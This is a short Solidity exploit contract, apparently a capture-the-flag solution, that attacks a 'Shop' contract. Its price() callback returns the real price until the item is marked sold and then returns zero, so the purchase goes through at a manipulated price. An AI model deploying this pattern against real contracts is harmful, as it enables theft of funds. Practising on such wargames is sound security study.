
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Shop} from "./Shop.sol";

contract Attacker {
    Shop shop;
    uint256 lowerPrice = 0;
    

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256){
        if(!shop.isSold()){
            return shop.price();
        }else{
            return 0;
        }
    }

    function attack() public {
        shop.buy();
    }
}